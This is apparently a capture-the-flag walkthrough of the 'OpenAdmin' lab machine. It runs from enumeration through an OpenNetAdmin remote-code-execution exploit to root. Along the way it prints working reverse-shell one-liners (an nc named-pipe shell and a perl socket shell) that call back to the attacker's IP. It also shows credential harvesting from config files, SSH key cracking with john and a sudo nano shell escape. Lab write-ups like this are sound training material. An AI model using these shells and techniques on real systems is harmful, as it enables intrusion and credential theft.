# OpenAdmin

## IP: 10.10.10.171

## OS: Linux

Kick it off with a basic `nmap` scan:

```bash
$ nmap -vvv -sCV -oN enumeration/openAdmin.nmap 10.10.10.171
# Nmap 7.80 scan initiated Sun Apr  5 22:44:35 2020 as: nmap -vvv -sCV -oN enumeration/openAdmin.nmap 10.10.10.171
Nmap scan report for 10.10.10.171
Host is up, received conn-refused (0.049s latency).
Scanned at 2020-04-05 22:44:35 CDT for 12s
Not shown: 998 closed ports
Reason: 998 conn-refused
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCcVHOWV8MC41kgTdwiBIBmUrM8vGHUM2Q7+a0LCl9jfH3bIpmuWnzwev97wpc8pRHPuKfKm0c3iHGII+cKSsVgzVtJfQdQ0j/GyDcBQ9s1VGHiYIjbpX30eM2P2N5g2hy9ZWsF36WMoo5Fr+mPNycf6Mf0QOODMVqbmE3VVZE1VlX3pNW4ZkMIpDSUR89JhH+PHz/miZ1OhBdSoNWYJIuWyn8DWLCGBQ7THxxYOfN1bwhfYRCRTv46tiayuF2NNKWaDqDq/DXZxSYjwpSVelFV+vybL6nU0f28PzpQsmvPab4PtMUb0epaj4ZFcB1VVITVCdBsiu4SpZDdElxkuQJz
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHqbD5jGewKxd8heN452cfS5LS/VdUroTScThdV8IiZdTxgSaXN1Qga4audhlYIGSyDdTEL8x2tPAFPpvipRrLE=
|   256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBcV0sVI0yWfjKsl7++B9FGfOVeWAIWZ4YGEMROPxxk4
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr  5 22:44:47 2020 -- 1 IP address (1 host up) scanned in 12.27 seconds
```

We see ports 22 and 80 are open.

Check for required password on `ssh`:

```bash
$ ssh 10.10.10.171
The authenticity of host '10.10.10.171 (10.10.10.171)' can't be established.
ECDSA key fingerprint is SHA256:loIRDdkV6Zb9r8OMF3jSDMW3MnV5lHgn4wIRq+vmBJY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.171' (ECDSA) to the list of known hosts.
alichtman@10.10.10.171's password:
Permission denied, please try again.
alichtman@10.10.10.171's password:

$ ssh root@10.10.10.171
root@10.10.10.171's password:
Permission denied, please try again.
root@10.10.10.171's password:
Permission denied, please try again.
root@10.10.10.171's password:
root@10.10.10.171: Permission denied (publickey,password).
```

No luck.

Navigating to the website shows me the Apache default page. This usually indicates some misconfiguration. Let's see what other files are on the webserver.

```bash
$ gobuster dir -u http://10.10.10.171 -w ~/tools/wordlists/directory-list-2.3-medium.txt -o gobuster-root.log --wildcard -t 40

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171
[+] Threads:        40
[+] Wordlist:       /home/alichtman/tools/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/05 22:51:38 Starting gobuster
===============================================================
/music (Status: 301)
/artwork (Status: 301)
/sierra (Status: 301)
/server-status (Status: 403)
===============================================================
2020/04/05 22:56:31 Finished
===============================================================
```


Navigating to `http://10.10.10.171/music`, clicking the menu button and then `Login` directs me to `http://10.10.10.171/ona`. A notice saying that a newer version is available is displayed in the upper left corner, and it shows that the current version is `v18.1.1`. Hovering over the `DOWNLOAD` hyperlink shows me that this piece of software is `OpenNetAdmin`.

```bash
$ searchsploit 18.1.1
---------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                        |  Path
                                                                      | (/usr/share/exploitdb/)
---------------------------------------------------------------------- ----------------------------------------
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)          | exploits/php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                           | exploits/php/webapps/47691.sh
---------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

Let's mirror that second result onto our local machine and take a look at the exploit.

```bash
$ mkdir exploits && cd exploits
$ searchsploit -m exploits/php/webapps/47691.sh
```

Then let's sanity check the shell script with `shellcheck`.

```bash
$ shellcheck exploits/47691.sh

In exploits/47691.sh line 1:
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
                                                            ^-- SC1017: Literal carriage return. Run script through tr -d '\r' .
...
```

We see a ton of `Literal carriage returns` in the output, with a suggested fix.

```
$ cat 47691.sh | tr -d '\r' > 47691.reformatted.sh
$ shellcheck 47691.reformatted.sh

In 47691.reformatted.sh line 17:
#!/bin/bash
^-- SC1128: The shebang must be on the first line. Delete blanks and move comments.


In 47691.reformatted.sh line 21:
 echo -n "$ "; read cmd
               ^--^ SC2162: read without -r will mangle backslashes.
```

Move the shebang to the first line and then we can run the script successfully.

```bash
$ ./47691.reformatted.sh http://10.10.10.171/ona/
$ echo "hi"
hi
$ whoami
www-data
```

Sweet, let's get a real shell going here.

Tried all standard reverse shells and all failed.

```bash
$ nc -lvnp 1234  # Listener on local machine
$ ./47691.reformatted.sh http://10.10.10.171/ona/ # Run remote command execution exploit
$ mknod /tmp/mypipe p
$ /bin/bash 0< /tmp/mypipe | nc 10.10.14.11 1234 1> /tmp/mypipe

# Back to listener
$ nc -lvnp 1235
listening on [any] 1235 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.171] 34870
ls
# Unreliable output, command doesn't always go through.
```

This shell is really unstable for some reason. Let's open another reverse shell and see if that's better. This `perl` reverse shell worked nicely:

```bash
$ perl -e 'use Socket;$i="10.10.14.11";$p=1235;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Now we have a stable shell. Let's look for some info we can use to compromise the box.

```bash
www-data@openadmin:/var/www/ona/local/config$ cat database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>
```

Here's a database username and password combination: `ona_sys` and `n1nj4W4rri0R!`.

We can run this command to get a `mysql` shell with:

```bash
$ mysql --user=ona_sys --password ona_default
Enter password: # n1nj4W4rri0R!

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| ona_default        |
+--------------------+
2 rows in set (0.00 sec)

mysql> use ona_default;
Database changed
mysql> show tables
    -> ;
+------------------------+
| Tables_in_ona_default  |
+------------------------+
| blocks                 |
| configuration_types    |
| configurations         |
| custom_attribute_types |
| custom_attributes      |
| dcm_module_list        |
| device_types           |
| devices                |
| dhcp_failover_groups   |
| dhcp_option_entries    |
| dhcp_options           |
| dhcp_pools             |
| dhcp_server_subnets    |
| dns                    |
| dns_server_domains     |
| dns_views              |
| domains                |
| group_assignments      |
| groups                 |
| host_roles             |
| hosts                  |
| interface_clusters     |
| interfaces             |
| locations              |
| manufacturers          |
| messages               |
| models                 |
| ona_logs               |
| permission_assignments |
| permissions            |
| roles                  |
| sequences              |
| sessions               |
| subnet_types           |
| subnets                |
| sys_config             |
| tags                   |
| users                  |
| vlan_campuses          |
| vlans                  |
+------------------------+
40 rows in set (0.00 sec)
mysql> describe users
    -> ;
+----------+------------------+------+-----+-------------------+-----------------------------+
| Field    | Type             | Null | Key | Default           | Extra                       |
+----------+------------------+------+-----+-------------------+-----------------------------+
| id       | int(10) unsigned | NO   | PRI | NULL              | auto_increment              |
| username | varchar(32)      | NO   | UNI | NULL              |                             |
| password | varchar(64)      | NO   |     | NULL              |                             |
| level    | int(4)           | NO   |     | 0                 |                             |
| ctime    | timestamp        | NO   |     | CURRENT_TIMESTAMP | on update CURRENT_TIMESTAMP |
| atime    | datetime         | YES  |     | NULL              |                             |
+----------+------------------+------+-----+-------------------+-----------------------------+
6 rows in set (0.01 sec)

mysql> show columns from users;
+----------+------------------+------+-----+-------------------+-----------------------------+
| Field    | Type             | Null | Key | Default           | Extra                       |
+----------+------------------+------+-----+-------------------+-----------------------------+
| id       | int(10) unsigned | NO   | PRI | NULL              | auto_increment              |
| username | varchar(32)      | NO   | UNI | NULL              |                             |
| password | varchar(64)      | NO   |     | NULL              |                             |
| level    | int(4)           | NO   |     | 0                 |                             |
| ctime    | timestamp        | NO   |     | CURRENT_TIMESTAMP | on update CURRENT_TIMESTAMP |
| atime    | datetime         | YES  |     | NULL              |                             |
+----------+------------------+------+-----+-------------------+-----------------------------+
6 rows in set (0.00 sec)

mysql> SELECT * FROM users;
+----+----------+----------------------------------+-------+---------------------+---------------------+
| id | username | password                         | level | ctime               | atime               |
+----+----------+----------------------------------+-------+---------------------+---------------------+
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2020-04-06 11:33:53 | 2020-04-06 11:33:53 |
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |
+----+----------+----------------------------------+-------+---------------------+---------------------+
2 rows in set (0.00 sec)
```

I tried using this login info to log in as an admin on the `ona` page we found earlier with no luck.

Spun up a python server and moved `LinEnum.sh` over to the target machine, and ran it. The output can be found in `privesc/LinEnum.output.1`.

Two users are found that look interesting: `jimmy` and `joanna`.

Let's try that `n1nj4W4rri0R!` password on these accounts.

```bash
www-data@openadmin:/var/www$ su jimmy
Password: # n1nj4W4rri0R!
jimmy@openadmin:/var/www$
```

Earlier I noticed a directory `/var/www/internal` that only `jimmy` had permissions for. Let's go check that out now.

```bash
jimmy@openadmin:/var/www/internal$ grep "pass" *
index.php:         .form-signin input[type="password"] {
index.php:            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
index.php:              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
index.php:                  $msg = 'Wrong username or password.';
index.php:            <input type = "password" class = "form-control"
index.php:               name = "password" required>
logout.php:   unset($_SESSION["password"]);
main.php:<h3>Don\'t forget your "ninja" password</h3>

# I want to check out main.php. That comment is interesting...

jimmy@openadmin:/var/www/internal$ cat main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

This script will print the ssh private key of `joanna` if we can get it to execute. It looks like it's being served, since it has a location specified in the file `/index.php`, so let's see what network connections are currently active on the box.

The command `$ netstat -tulp` will show us TCP and UDP sockets that are listening, and print the PID and name of the program to which each socket belongs.

```bash
$ netstat -tulp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN      -
tcp        0      0 localhost:52846         0.0.0.0:*               LISTEN      -
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      -
tcp6       0      0 [::]:http               [::]:*                  LISTEN      -
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      -
udp        0      0 localhost:domain        0.0.0.0:*                           -
```

Looks like port `52846` has something running on it. Let's see if it's the script we want.

```bash
$ curl 127.0.0.1:52846/main.php
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
```

And there is the SSH private key for `joanna`. Let's save this to a file and SSH in as `joanna`.

```bash
$ ssh joanna@10.10.10.171 -i joanna.ssh.privatekey
Enter passphrase for key 'joanna.ssh.privatekey':
```

Ok. Maybe not so easy. Let's see if `john` can crack this for us:

```bash
$ ssh2john.py joanna.ssh.privatekey > ssh2john.joanna.privkey
$ john ssh2john.joanna.privkey -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna.ssh.privatekey)
1g 0:00:00:03 DONE (2020-04-06 18:51) 0.2724g/s 3907Kp/s 3907Kc/s 3907KC/s     ciocolatax..clarus
Session completed
```

So the password to the `joanna` private key seems to be `bloodninjas`.

```bash
$ ssh joanna@10.10.10.171 -i joanna.ssh.privatekey
Enter passphrase for key 'joanna.ssh.privatekey':
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Apr  6 23:57:14 UTC 2020

  System load:  1.21              Processes:             157
  Usage of /:   50.5% of 7.81GB   Users logged in:       0
  Memory usage: 35%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Apr  6 15:13:20 2020 from 10.10.14.30
joanna@openadmin:~$ wc user.txt
 1  1 33 user.txt
```

Great, we have the user proof.

Time for a root privesc.

Let's run `LinEnum.sh` again now that we have the `joanna` user owned.


```bash
...
[+] We can sudo without supplying a password!
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv


[+] Possible sudo pwnage!
/bin/nano
...
```

Let's try using this trick from [GTFObins](https://gtfobins.github.io/gtfobins/nano/) to start a shell from nano, with root privileges.

```bash
$ sudo -u root nano /opt/priv
^R^X
reset; sh 1>&0 2>&0
# whoami
root
# wc /root/root.txt
 1  1 33 /root/root.txt
```
